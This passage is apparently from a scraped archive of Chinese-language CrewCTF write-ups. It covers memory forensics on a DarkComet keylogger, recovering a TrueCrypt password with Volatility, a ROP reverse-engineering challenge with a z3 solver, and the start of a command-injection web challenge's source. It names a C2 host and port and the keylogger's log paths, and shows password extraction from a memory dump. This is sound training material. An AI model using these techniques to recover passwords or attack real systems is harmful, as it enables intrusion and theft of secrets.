AutoHotkeysd-C AutoHotkeys AutoHotkeys TWMKey System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x TKeyEvent TKeyPressEvent HelpKeyword nA 80211_SHARED_KEY KEYNAME KEYNAME KEYNAME KEYNAME RegOpenKeyExA RegCloseKey GetKeyboardType keybd_event VkKeyScanA MapVirtualKeyA LoadKeyboardLayoutA GetKeyboardState GetKeyboardLayoutNameA GetKeyboardLayoutList GetKeyboardLayout GetKeyState GetKeyNameTextA ActivateKeyboardLayout RegQueryInfoKeyA RegOpenKeyExA RegOpenKeyA RegFlushKey RegEnumKeyExA RegDeleteKeyA RegCreateKeyExA RegCreateKeyA RegCloseKey UntKeylogger UntControlKey 一個一個try就可以了\nFlag: crew{GetKeyState}\n==Attaaaaack 8== # Q8. What is the Attacker\u0026rsquo;s C2 domain name and port number ? (domain name:port number) example : crew{abcd.com:8080}\nBackground # CyberDefender - MrRobot - POS - Q21\nRecon # 這一題直覺會想用netscan，畢竟從前面的題目以及找到的資訊，還有virustotal上的資訊，幾乎確定他就是一個keylogger，然後會把得到的資訊傳回去C\u0026amp;C server中，但奇怪的是察看netscan沒有相關的connection，不確定到底是怎麼樣，找了很久，最後是參考siunam321的writeup，他也是找了很久，結果其實virustotal都已經寫好了，\nExploit # 在Behavior的地方\nFlag: crew{test213.no-ip.info:1604}\n==Attaaaaack 9== # Q9. Seems that there is Keylogger, can you find it\u0026rsquo;s path ? example : crew{C:\\Windows\\System32\\abc.def}\nBackground # Recon # 這一題完全不會，所以看了siunam321的writeup，他的做法是到網路上找有沒有test213.no-ip.info keylogger的相關文章，結果TekDefense就有提到這隻malware\nThe OFFLINEK option had me confused for a bit. So to explain it a bit better, when OFFLINEK is enabled “{1}” the malware will continue to log keystroke to a local file that can then be picked up by the attacker as they want. When disabled, the attacker only has access to keystrokes when the attacker has a live session open with the victim.\n簡單來說就是他有一個參數(OFFLINEK)，如果被設定為1，則在離線的時候還是會繼續記錄，然後把結果存在local file，這也回應了前面位甚麼用netscan找不到的原因，因為作者沒有連線，所以當然不會有相關的process，而該bloger也找到了他存在local端的地方就在 C:\\Users\\{Username}\\AppData\\Roaming\\dclogs\\{timestamp}.dc Exploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 filescan | findstr .dc | findstr \\AppData\\Roaming\\dclogs Volatility Foundation Volatility Framework 2.6 0x000000003fcb3350 8 0 -W-r-- \\Device\\HarddiskVolume1\\Users\\0xSh3rl0ck\\AppData\\Roaming\\dclogs\\2023-02-20-2.dc Flag: crew{C:\\Users\\0xSh3rl0ck\\AppData\\Roaming\\dclogs\\2023-02-20-2.dc}\n==Attaaaaack 10== # Q10. we think that the malware uses persistence technique can you detect it ? example : crew{Scheduled_tasks} (first letter of the first word is uppercase and the first letter of other is lowercase)\nBackground # NTUSTISC - CyberDefender - MrRobot - Target 1 - Q5\nRecon # 這題background可以看前面寫的文章，然後基本上都差不多，只是要特別注意-K後面帶的參數，一定要是從Software開始，他和原本cyberdefender的版本有點不太一樣，下-k參數之前先看printkey印出甚麼東西，然後再從他的subkey往後推看是要接Software還是Mircosoft，基本上都會寫在**\\REGISTRY\\USER\\**的部分\nExploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 printkey -K \u0026#34;Software\\Microsoft\\Windows\\CurrentVersion\\Run\u0026#34; Volatility Foundation Volatility Framework 2.6 Legend: (S) = Stable (V) = Volatile ---------------------------- Registry: \\??\\C:\\Users\\0xSh3rl0ck\\ntuser.dat Key name: Run (S) Last updated: 2023-02-20 19:03:40 UTC+0000 Subkeys: Values: REG_SZ MicroUpdate : (S) C:\\Users\\0XSH3R~1\\AppData\\Local\\Temp\\MSDCSC\\runddl32.exe ---------------------------- Registry: \\REGISTRY\\USER\\S-1-5-20 Key name: Run (S) Last updated: 2009-07-14 04:34:14 UTC+0000 Subkeys: Values: REG_EXPAND_SZ Sidebar : (S) %ProgramFiles%\\Windows Sidebar\\Sidebar.exe /autoRun ---------------------------- Registry: \\??\\C:\\Windows\\ServiceProfiles\\LocalService\\NTUSER.DAT Key name: Run (S) Last updated: 2009-07-14 04:34:14 UTC+0000 Subkeys: Values: REG_EXPAND_SZ Sidebar : (S) %ProgramFiles%\\Windows Sidebar\\Sidebar.exe /autoRun Flag: crew{Registry_keys}\n==Attaaaaack 11== # Q11. can you find the key name and it\u0026rsquo;s value ? example : crew{CurrentVersion_ProductName}\nExploit # 從上一題的輸出就知道key name是run，然後value是MicroUpdate Flag: crew{Run_MicroUpdate}\n==Attaaaaack 12== # Q12. What is the strange handle used by the malware ? example : crew{the name of the handle}\nBackground # NTUSTISC - CyberDefender - MrRobot - Target 1 - Q6\nRecon # 基本上就和之前寫的文章一樣，\nExploit # $ volatility_2.6_win64_standalone.exe -f memdump.raw --profile Win7SP1x86_23418 handles --pid 300 | findstr Mutant Volatility Foundation Volatility Framework 2.6 Offset(V) Pid Handle Access Type Details ---------- ------ ---------- ---------- ---------------- ------- 0x843b0728 300 0x58 0x1f0001 Mutant 0x843b0b28 300 0x5c 0x1f0001 Mutant 0x842eb8b8 300 0x170 0x1f0001 Mutant DC_MUTEX-KHNEW06 0x843ac810 300 0x234 0x1f0001 Mutant 0x843ac7c0 300 0x23c 0x1f0001 Mutant Flag: crew{DC_MUTEX-KHNEW06}\n==Attaaaaack 13== # Q13. Now can you help us to know the Family of this malware ? example : crew{Malware}\nRecon # 這一題在第7題就找到了\nExploit # Flag: crew{DarkKomet}\nReference # Attaaaaack3\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":46,"href":"/security/practice/crewctf/misc/crewctf---encrypt10npart-1/","title":"CrewCTF - Encrypt10n(Part 1)","section":"Securities","content":" CrewCTF - Encrypt10n(Part 1) # Background # Volatility 3\nRecon # Description: We made a memory dump on the criminal machine after entering the crime scene. Our investigator thought he was using encryption software to hide the secret. can you help me to detect it? Q1 : crew{password} 這種類型之前沒碰過，所以看了別人的WP學一下1 首先他有提到他有用加密的技術隱藏secret，所以我們的目的就是要找到password Exploit - Memory Forensics # 先找到運行的OS version或其他軟硬體資訊 $ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/mnt/d/Download/Trash/dump.raw) PAE type : PAE DTB : 0x185000L KDBG : 0x82b3db78L Number of Processors : 1 Image Type (Service Pack) : 1 KPCR for CPU 0 : 0x839a5000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2023-02-16 12:03:16 UTC+0000 Image local date and time : 2023-02-16 14:03:16 +0200 重點: Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 列出當時系統正在運行的process $ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw pslist --profile=Win7SP0x86 Volatility Foundation Volatility Framework 2.6.1 Offset(V) Name PID PPID Thds Hnds Sess Wow64 Start Exit ---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------ 0x8413a938 System 4 0 88 520 ------ 0 2023-02-16 12:00:48 UTC+0000 0x84e481c8 smss.exe 252 4 2 29 ------ 0 2023-02-16 12:00:49 UTC+0000 0x84cae358 csrss.exe 340 324 8 550 0 0 2023-02-16 12:00:53 UTC+0000 0x844ea030 wininit.exe 392 324 3 77 0 0 2023-02-16 12:00:54 UTC+0000 0x84ef5030 csrss.exe 400 384 9 223 1 0 2023-02-16 12:00:54 UTC+0000 0x8573dd20 winlogon.exe 456 384 6 114 1 0 2023-02-16 12:00:54 UTC+0000 0x85749868 services.exe 496 392 8 228 0 0 2023-02-16 12:00:54 UTC+0000 0x85763030 lsass.exe 508 392 7 578 0 0 2023-02-16 12:00:55 UTC+0000 0x85764030 lsm.exe 516 392 10 149 0 0 2023-02-16 12:00:55 UTC+0000 0x857bd510 svchost.exe 624 496 11 362 0 0 2023-02-16 12:00:56 UTC+0000 0x85809510 svchost.exe 704 496 7 298 0 0 2023-02-16 12:00:56 UTC+0000 0x85859920 svchost.exe 784 496 23 510 0 0 2023-02-16 12:00:56 UTC+0000 0x8586da80 svchost.exe 832 496 15 265 0 0 2023-02-16 12:00:57 UTC+0000 0x85872bb0 svchost.exe 856 496 22 731 0 0 2023-02-16 12:00:57 UTC+0000 0x85875460 svchost.exe 880 496 47 1013 0 0 2023-02-16 12:00:57 UTC+0000 0x8588f370 audiodg.exe 960 784 6 132 0 0 2023-02-16 12:00:57 UTC+0000 0x858c2420 svchost.exe 1092 496 18 389 0 0 2023-02-16 12:00:58 UTC+0000 0x857d6030 spoolsv.exe 1288 496 15 270 0 0 2023-02-16 12:00:59 UTC+0000 0x857d1030 dwm.exe 1296 832 6 114 1 0 2023-02-16 12:00:59 UTC+0000 0x857c7030 svchost.exe 1324 496 21 310 0 0 2023-02-16 12:00:59 UTC+0000 0x857a5d20 explorer.exe 1384 1276 33 923 1 0 2023-02-16 12:00:59 UTC+0000 0x857c4d20 taskhost.exe 1400 496 10 197 1 0 2023-02-16 12:00:59 UTC+0000 0x85837898 svchost.exe 1560 496 11 146 0 0 2023-02-16 12:01:00 UTC+0000 0x841d1030 VGAuthService. 1720 496 4 85 0 0 2023-02-16 12:01:01 UTC+0000 0x841d7118 vmtoolsd.exe 1736 1384 10 181 1 0 2023-02-16 12:01:02 UTC+0000 0x85856030 vm3dservice.ex 1836 496 5 60 0 0 2023-02-16 12:01:03 UTC+0000 0x85857d20 vmtoolsd.exe 1856 496 14 291 0 0 2023-02-16 12:01:03 UTC+0000 0x841e5678 vm3dservice.ex 1880 1836 3 44 1 0 2023-02-16 12:01:03 UTC+0000 0x85a26030 svchost.exe 384 496 8 93 0 0 2023-02-16 12:01:05 UTC+0000 0x85a6e5d0 dllhost.exe 876 496 21 191 0 0 2023-02-16 12:01:05 UTC+0000 0x85941c28 dllhost.exe 1744 496 18 200 0 0 2023-02-16 12:01:05 UTC+0000 0x85ab6260 msdtc.exe 1128 496 15 154 0 0 2023-02-16 12:01:06 UTC+0000 0x85ac8b00 WmiPrvSE.exe 232 624 10 193 0 0 2023-02-16 12:01:06 UTC+0000 0x841f4470 SearchIndexer. 2148 496 14 604 0 0 2023-02-16 12:01:08 UTC+0000 0x85b2a030 VSSVC.exe 2276 496 7 118 0 0 2023-02-16 12:01:11 UTC+0000 0x85b80cb8 SearchProtocol 2372 2148 9 284 0 0 2023-02-16 12:01:13 UTC+0000 0x85b855f8 SearchFilterHo 2392 2148 6 104 0 0 2023-02-16 12:01:13 UTC+0000 0x85b97d20 svchost.exe 2480 496 15 232 0 0 2023-02-16 12:01:15 UTC+0000 0x85bc5398 wmpnetwk.exe 2632 496 11 212 0 0 2023-02-16 12:01:16 UTC+0000 0x85bba030 WmiPrvSE.exe 2860 624 15 319 0 0 2023-02-16 12:01:25 UTC+0000 0x85c53030 WmiApSrv.exe 3004 496 6 112 0 0 2023-02-16 12:01:30 UTC+0000 0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000 0x84d54d20 sppsvc.exe 3736 496 6 154 0 0 2023-02-16 12:03:05 UTC+0000 0x84d567f0 svchost.exe 3776 496 15 353 0 0 2023-02-16 12:03:05 UTC+0000 0x844fcd20 DumpIt.exe 4072 1384 2 38 1 0 2023-02-16 12:03:14 UTC+0000 0x844ba6e0 conhost.exe 4080 400 2 51 1 0 2023-02-16 12:03:14 UTC+0000 重點：0x85c596c0 TrueCrypt.exe 3196 1384 2 67 1 0 2023-02-16 12:02:07 UTC+0000 TrueCrypt - Wiki TrueCrypt是一款已停止開發的動態（On-the-fly）磁碟加密軟體，支援Windows、macOS和Linux作業系統。它可在單個檔案和磁碟分割區中建立加密區，也可以加密整個作業系統，解密後使用者即可像普通分割區一樣使用其中的檔案。TrueCrypt支援使用密碼、金鑰檔案作為解密憑據。\n取得密碼 用volatility 2的plugin(目前好像只有Ver. 2有這個plugin) $ python ../../Software/CTF/Misc/volatility/vol.py -f dump.raw --profile=Win7SP0x86 truecryptsummary Volatility Foundation Volatility Framework 2.6.1 Registry Version TrueCrypt Version 7.0a Password Strooooong_Passwword at offset 0x8d23de44 Process TrueCrypt.exe at 0x85c596c0 pid 3196 Service truecrypt state SERVICE_RUNNING Kernel Module truecrypt.sys at 0x8d20a000 - 0x8d241000 Symbolic Link Volume{a2e4e949-a9a8-11ed-859c-50eb71124999} -\u0026gt; \\Device\\TrueCryptVolumeZ mounted 2023-02-16 12:02:56 UTC+0000 Driver \\Driver\\truecrypt at 0x3f02fc98 range 0x8d20a000 - 0x8d240980 Device TrueCrypt at 0x84e2a9d8 type FILE_DEVICE_UNKNOWN Flag: crew{Strooooong_Passwword}\nReference # CTFTime - Encrypt10n\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":47,"href":"/security/practice/crewctf/misc/crewctf---encrypt10npart-2/","title":"CrewCTF - Encrypt10n(Part 2)","section":"Securities","content":" CrewCTF - Encrypt10n(Part 2) # Background # How To Open A TrueCrypt Container Using cryptsetup\n$ sudo cryptsetup --type tcrypt open container-to-mount container-name\n什麽是塊設備，什麽是字符設備？有什麽區別？\nRecon # 這一題應該是沿用part 1得到的密碼進行解密\nExploit # 用cryptsetup1先進行解密\n$ sudo cryptsetup --type tcrypt open flag flag_decrypt Enter passphrase for flag: 則輸出的結果就是一個container儲存在/dev/mapper，可以看到它是一個block device\n$ ll /dev/mapper total 0 drwxr-xr-x 2 root root 80 Jul 12 21:44 . drwxr-xr-x 11 root root 3140 Jul 12 21:44 .. crw------- 1 root root 10, 236 Jul 11 23:06 control brw-rw---- 1 root disk 252, 3 Jul 12 21:44 flag_dec 再來就要把這個container掛起來，要掛起來才能讀取裡面的資料\n$ sudo mkdir /mnt/flag_dec $ sudo mount -o uid=1000 /dev/mapper/flag_dec /mnt/flag_dec $ ll /mnt/flag_dec total 12 drwxrwxrwx 1 sbk6401 root 4096 Feb 16 19:38 . drwxr-xr-x 7 root root 4096 Jul 12 21:57 .. -rwxrwxrwx 2 sbk6401 root 2360 Feb 12 01:08 flaaaaaaaaaaaaaaaaaaaaaaaag.txt $ cat /mnt/flag_dec/flaaaaaaaaaaaaaaaaaaaaaaaag.txt Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjFac2JETlhhMk0xVjBaS2MySkVUbGhoTWsweFZtcEJlRll5U2tWVWJHaG9UV3N3ZUZadGNFdFRNVWw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZwV01VcEpWbTEwYTFkSFNrZGpSVGxhVmpOU1IxcFZXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmJGSmlSMmhZV1d4b2IwMHhXbGRYYlhSWFRWZDBObGxWV2xOVWJGcFlaSHBDVjAxdVVuWlZha1pYWkVaT2MxZHNhR2xTTW1oWlYxWmtNRmxXVWtkV1dHaFlZbGhTV0ZSV2FFTlNiRnBZWlVoa1YwMUVSbGRaTUZaM1ZqSktWVkpZWkZkaGExcFlXa1ZhVDJNeFpITmhSMnhUVFcxb1dsWXhaRFJWTVZsNFUydGthbEp0VWxsWmJGWmhZMVpzY2xkdFJteFdia0pIVmpKNFQxWlhTa2RqUm14aFUwaENSRlpxU2tabFZsSlpZVVprVTFKWVFrbFhXSEJIVkRKU1YxZHVUbFJpVjJoeldXeG9iMWRXV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkhhRlJXTVZwWFkxWktjbVJHVWxkaWEwcElWbXBLZWs1V1dsaFRhMXBxVWxkb1dGUlhOVU5oUmxweFVtMUdUMkpGV2xwWlZWcGhZVWRGZUdOSE9WaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXMW9lbGRYZUc5aU1XUnpWMWhvWVZKR1NuQlVWM1J6VFRGU1ZtRkhPVmhTTUhCNVZHeGFjMWR0U2toaFJsSlhUVVp3VkZacVJuZFNWa1p5VDFkc1UwMHlhRmxXYlhCTFRrWlJlRmRzYUZSaVJuQnhWV3hrVTFsV1VsWlhiVVpPVFZad2VGVXlkREJXTVZweVkwWndXR0V4Y0hKWlZXUkdaVWRPU0U5V1pHaGhNSEJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZtUlhWV3M1VWsxWFVucFdNV2h2V1ZaS1IxTnNaRlZXYkZwNlZGUkdVMk15UmtaUFYyaHBVbGhDTmxkVVFtRmpNV1IwVTJ0a1dHSlhhRmhaVkVaM1ZrWmFjVkp0ZEd0U2EzQXdXbFZhYTJGV1NuTmhNMmhYWVRGd2FGWlVSbFpsUm1SMVUyczFXRkpZUW5oV1Z6QjRZakZaZUZWc2FFOVdlbXh6V1d0YWQyVkdWWGxrUkVKWFRWWndlVll5ZUhkWGJGcFhZMGhLVjJGcldreFdha3BQVWpKS1IxcEdaRTVOUlhCS1ZqRmFVMU14VlhoWFdHaFlZbXhhVjFsc2FHOVdSbXhaWTBaa1dGWnNjRmxaTUZVMVlWVXhXRlZ1Y0ZkTlYyaDJWMVphUzFJeFRuTmFSbFpYWWtadmVsWkdWbUZaVjFKR1RsWmFVRll5YUhCVmJHaENaREZrVjFadE9WVk5WbkF3VlcwMVMxWkhTbGhoUm1oYVZrVmFNMVpyV21GalZrcDFXa1pPVGxacmIzZFhiRlpyWXpGVmVWTnVTbFJoTTFKWVZGYzFiMWRHYkZWU2EzQnNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpXVkVaclVqRldjMkZGT1ZkaGVsWjVWMWQwWVdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtNU9XR0pHY0ZoWk1GSlBWMnhhV0ZWclpHRldNMmhJV1RJeFIxSXlSa2hoUlRWWFYwVktSbFpxU2pSV01XeFhWVmhvWVZKWFVsWlpiWFIzWWpGV2NWTnRPVmRTYlhoNVZtMDFhMVl4V25OalNHaFdWak5vY2xaclZYaFhSbFp6WVVaa1RtRnNXazFXYWtKclV6Rk9SMVp1VWxCV2JGcFlXV3RvUTJJeFdrZFdiVVphVm14c05WVnRkRzlWUmxsNVlVWm9XbGRJUWxoVk1GcGhZMVpPY1ZWc1drNVdNVWwzVmxSS05GWXhWWGxUYTJSVVlsVmFWbFp0ZUhkTk1WcHlWMjFHYWxacmNEQlZiVEV3VmpKS2NsTnJiRmROYmxKeVdYcEdWbVF3TVVsaVIwWnNZVEZ3V1ZkWGVHOVJNVkpIVld4YVlWSldjSE5WYlRGVFYyeHNjbGRzVG1oU1ZFWjZWVEkxYjFZeFdYcGhSMmhoVWtWYVlWcFZXbXRrVmxaMFpVWk9XRkpyY0ZwV2ExcGhXVlpzVjFSclpGZGlhelZYV1cxek1WWXhXblJsUjBaWFlrWktWMVpYTlV0VlZsWlZUVVJyUFE9PQ== Decode flag A lots of base64 encoding :::spoiler Screenshot :::\nUnmount \u0026amp; Delete\n$ sudo umount /mnt/flag_dec $ sudo rm -R -f /mnt/flag_dec $ sudo rm -R -f /dev/mapper/flag_dec $ sudo dmsetup remove_all Flag: crew{Tru33333_Crypt_w1th_V014t1l1ty!}\nReference # How To Open A TrueCrypt Container Using cryptsetup\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":48,"href":"/security/practice/crewctf/reverse/crewctf---ez-rev/","title":"CrewCTF - ez rev","section":"Securities","content":" CrewCTF - ez rev # Source Code # :::spoiler IDA Fake Main Function\nvoid __fastcall __noreturn main(int a1, char **a2, char **a3) { int i; // [rsp+Ch] [rbp-4h] puts(\u0026#34;[+] Another flag checker...\u0026#34;); fgets(byte_4200E0, 256, stdin); if ( byte_4200E0[strlen(byte_4200E0) - 1] == 10 ) byte_4200E0[strlen(byte_4200E0) - 1] = 0; for ( i = 0; i \u0026lt;= 73; ++i ) { if ( byte_4200E0[i] != (byte_420060[i] ^ 0x70) ) sub_401220(); } sub_401202(); } :::\nRecon # 首先這一題真的太難了，超出我的守備範圍，所以我先寫一些當作紀錄，之後可以更快銜接繼續解\n首先可以執行一下，如果是在Ubuntu 20.04(預設Libc版本是2.31)的版本和其他版本會有不一樣的output\n$ ldd --version ldd (Ubuntu GLIBC 2.31-0ubuntu9.9) 2.31 Copyright (C) 2020 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. $ ./a.out [+] Another flag checker... 123456 [-] No :( $ ldd --version ldd (Ubuntu GLIBC 2.35-0ubuntu3) 2.35 Copyright (C) 2022 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Written by Roland McGrath and Ulrich Drepper. ./a.out [+] Another flag checker... 123456 [-] Why you still here 這是因為他和這隻程式執行的過程有關係\n用IDA看一下發現有翻譯出main function，但這個main function其實是假的，這個可以從上面的進度條看出來，橘色的部分感覺很可疑，而假的main function卻是在整個進度的後半段，代表可以往前分析一下，但由於整體的流程太長，所以搞事的部分沒辦法分析出來，這要用動態去看會比較清楚(真正的main function是在==sub_40123E()==) 另外也可以用strings xref的方式知道他call strings的地方有兩個，其中一個就是真的main function 分析real main function過程大概是\n用ptrace看有沒有使用debugger，所以這邊要先patch 接著輸入flag，放在0x4200e0 接著就是進入loc_4012FE()，這邊應該就是做一些檢查，也要patch，會做三次，如果都正確才會真正進入到搞事的function(loc_4013AA)，否則會進到loc_401394說掰掰，這一段其實就是在檢查libc是不是在正確的版本以利後面的搞事節奏 搞事的function做的事情很簡單，就是不斷用*($rbp-0x100e0)(也就是0x00007ffff7da52fd)做一些offset的加減，然後把對應到的address放到$rbp對應的位置 例如： 0x7ffffffed8c0:\t0x00000000000008c0\t0x0000000000000a40 0x7ffffffed8d0:\t0x00007ffff7dc4000\t0x0000000000000014 0x7ffffffed8e0:\t0x00007ffff7de684d\t0x00007ffff7de7b6a 0x7ffffffed8f0:\t0x00007ffff7dfa174\t0x00007ffff7de66c0 0x7ffffffed900:\t0x00007ffff7dea01f\t0x00007ffff7f06c92 0x7ffffffed910:\t0x00007ffff7ec657e\t0x00000000004011fc 0x7ffffffed920:\t0x00007ffff7ed055f\t0x00007ffff7ea9190 0x7ffffffed930:\t0x00007ffff7e58eab\t0x00007ffff7e70186 0x7ffffffed940:\t0x00007ffff7df9a22\t0x00007ffff7dea6e3 0x7ffffffed950:\t0x00007ffff7e72df5\t0x00007ffff7e6ff48 0x7ffffffed960:\t0x00007ffff7e6e38c\t0x00007ffff7e3561e 0x7ffffffed970:\t0x00007ffff7f0873b\t0x00007ffff7eb5b65 0x7ffffffed980:\t0x00007ffff7e701dc\t0x00007ffff7df7da1 0x7ffffffed990:\t0x00007ffff7ee37d7\t0x00000000004011ee 0x7ffffffed9a0:\t0x00000000004011f3\t0x00000000004011f8 0x7ffffffed9b0:\t0x00007ffff7dea01f(pop rsi; ret)\t0x00000000000000ff 0x7ffffffed9c0:\t0x00007ffff7de66c0(pop rbp; ret)\t0x0000000000420328 0x7ffffffed9d0:\t0x00007ffff7f06c92(pop rdx; ret)\t0x0000000000000000 0x7ffffffed9e0:\t0x00007ffff7e58eab(cmp DWORD PTR [rbp+rdx*1+0x0], esi; ret)\t0x00007ffff7dfa174(pop rax; ret) 0x7ffffffed9f0:\t0x0000000000000000\t0x00007ffff7ed055f(setl al; ret) 0x7ffffffeda00:\t0x00000000004011ee\t0x00007ffff7dea01f 0x7ffffffeda10:\t0x000000000000001a\t0x00000000004011f3 0x7ffffffeda20:\t0x00007ffff7ec657e\t0x0000000000000000 0x7ffffffeda30:\t0x0000000038188124\t0x00007ffff7e72df5 0x7ffffffeda40:\t0x00007ffff7dfa174\t0x000000000042029d 放完之後就call memcpy(src=0x00007ffffffed9b0, dest=0x00007ffffffed8b0, n=0x6e50)，然後執行ROP，沒錯就是ROP，所以他要先在前面檢查libc的版本，讓他可以取得正確的gadget 現在的問題是因為他存放的ROP太多也很複雜，導致我不知道哪邊其實是確切在執行check flag的環節，我有想說要找system call之類的gadget，但還找不到，所以分析了老半天還是沒結果 Exploit # Discord上別人的腳本 :::spoiler Script\nfrom z3 import * s = Solver() flag = [BitVec(f\u0026#34;flag[{i}]\u0026#34;,8) for i in range(0x100)] tmp = [] t = 0x69 for i in range(len(flag)): t = (flag[i]+i)^t tmp.append(t) t = 0x96 for i in range(1,len(flag)): tmp[i] = ((tmp[i-1] - tmp[i]) ^ t)\u0026amp;0xff t = tmp[i] enc = bytes.fromhex(\u0026#34;0a07ee64058ef6943d85178411691c8902751f8c01830b85169a0e8c0084038517b30f9f3ce417b7609537f9d5af46a243b15aa07c62f96b06ad1dc93ef3e49332c31ea10ac31cd330d33cd03ece8bdf32c209cf81cd89c9f33295c480ba99e910e009dd3039743e655f3a2010c42c0812c824dc58736b5454736f2cf033d374bc33b73ca8d3fb34a4d3ff2ca0d3e354cc53c75cf8334b54f4334f6cd073b3349cf397fc88d39bf484d39fec80d383d4ec53e75c98f3abd494f3\u0026#34;) for i in range(len(enc)): s.add(enc[i] == tmp[i]) print(s.check()) m = s.model() for d in m.decls(): print(\u0026#34;%s = %s\u0026#34;%(d.name(),m[d])) flag = [0]*0x100 flag[5] = 116 flag[42] = 110 flag[175] = 0 flag[137] = 0 flag[34] = 98 flag[118] = 0 flag[65] = 114 flag[54] = 99 flag[23] = 111 flag[31] = 97 flag[38] = 111 flag[177] = 0 flag[55] = 105 flag[0] = 99 flag[120] = 0 flag[128] = 0 flag[62] = 111 flag[13] = 105 flag[180] = 0 flag[44] = 120 flag[25] = 95 flag[28] = 112 flag[50] = 101 flag[57] = 108 flag[27] = 111 flag[71] = 98 flag[33] = 95 flag[133] = 0 flag[158] = 0 flag[169] = 0 flag[115] = 125 flag[184] = 0 flag[140] = 0 flag[91] = 116 flag[24] = 119 flag[106] = 103 flag[59] = 121 flag[74] = 95 flag[170] = 0 flag[160] = 0 flag[49] = 95 flag[147] = 0 flag[69] = 114 flag[80] = 117 flag[93] = 105 flag[68] = 101 flag[97] = 111 flag[30] = 99 flag[101] = 114 flag[32] = 110 flag[4] = 99 flag[58] = 108 flag[10] = 108 flag[63] = 114 flag[159] = 0 flag[26] = 114 flag[168] = 0 flag[45] = 105 flag[29] = 95 flag[72] = 117 flag[64] = 95 flag[179] = 0 flag[99] = 95 flag[47] = 117 flag[108] = 100 flag[129] = 0 flag[119] = 0 flag[2] = 101 flag[39] = 95 flag[139] = 0 flag[11] = 108 flag[8] = 119 flag[149] = 0 flag[35] = 101 flag[3] = 119 flag[142] = 0 flag[131] = 0 flag[60] = 95 flag[178] = 0 flag[19] = 116 flag[22] = 110 flag[40] = 111 flag[113] = 101 flag[95] = 95 flag[121] = 0 flag[96] = 121 flag[134] = 0 flag[136] = 0 flag[141] = 0 flag[67] = 118 flag[145] = 0 flag[150] = 0 flag[73] = 116 flag[83] = 97 flag[151] = 0 flag[155] = 0 flag[172] = 0 flag[174] = 0 flag[14] = 95 flag[103] = 95 flag[132] = 0 flag[138] = 0 flag[163] = 0 flag[36] = 95 flag[78] = 121 flag[37] = 115 flag[109] = 95 flag[153] = 0 flag[107] = 111 flag[76] = 102 flag[125] = 0 flag[53] = 101 flag[85] = 95 flag[51] = 115 flag[173] = 0 flag[176] = 0 flag[181] = 0 flag[182] = 0 flag[18] = 110 flag[16] = 105 flag[104] = 97 flag[123] = 0 flag[61] = 102 flag[43] = 111 flag[126] = 0 flag[185] = 0 flag[6] = 102 flag[90] = 95 flag[148] = 0 flag[165] = 0 flag[48] = 115 flag[117] = 0 flag[164] = 0 flag[114] = 114 flag[98] = 117 flag[77] = 95 flag[79] = 111 flag[84] = 110 flag[88] = 110 flag[105] = 95 flag[122] = 0 flag[127] = 0 flag[111] = 101 flag[156] = 0 flag[81] = 95 flag[166] = 0 flag[21] = 107 flag[161] = 0 flag[183] = 0 flag[86] = 102 flag[171] = 0 flag[20] = 95 flag[87] = 105 flag[92] = 104 flag[46] = 111 flag[146] = 0 flag[12] = 95 flag[167] = 0 flag[157] = 0 flag[52] = 112 flag[56] = 97 flag[102] = 101 flag[130] = 0 flag[152] = 0 flag[89] = 100 flag[41] = 98 flag[162] = 0 flag[110] = 114 flag[144] = 0 flag[7] = 123 flag[17] = 100 flag[66] = 101 flag[82] = 99 flag[100] = 97 flag[1] = 114 flag[75] = 105 flag[116] = 0 flag[94] = 115 flag[124] = 0 flag[135] = 0 flag[143] = 0 flag[112] = 118 flag[9] = 101 flag[15] = 100 flag[70] = 95 flag[154] = 0 print(bytes(flag)) :::\nFlag: crewctf{well_i_didnt_know_rop_can_be_so_obnoxious_especially_for_rever_but_if_you_can_find_this_you_are_a_god_rever}\n"},{"id":49,"href":"/security/practice/crewctf/web/crewctf---sequence_gallery/","title":"CrewCTF - sequence_gallery","section":"Securities","content":" CrewCTF - sequence_gallery # Background # Command Injection dc command in Linux with examples Linux dc命令\ndc -h Usage: dc [OPTION] [file \u0026hellip;] -e, \u0026ndash;expression=EXPR evaluate expression -f, \u0026ndash;file=FILE evaluate contents of file -h, \u0026ndash;help display this help and exit -V, \u0026ndash;version output version information and exit\nEmail bug reports to: bug-dc@gnu.org .\nSource Code # :::spoiler Source Code\nimport os import sqlite3 import subprocess from flask import Flask, request, render_template app = Flask(__name__) @app.get(\u0026#39;/\u0026#39;) def index(): sequence = request.args.get(\u0026#39;sequence\u0026#39;, None) if sequence is None: return render_template(\u0026#39;index.html\u0026#39;) script_file = os.path.basename(sequence + \u0026#39;.dc\u0026#39;) if 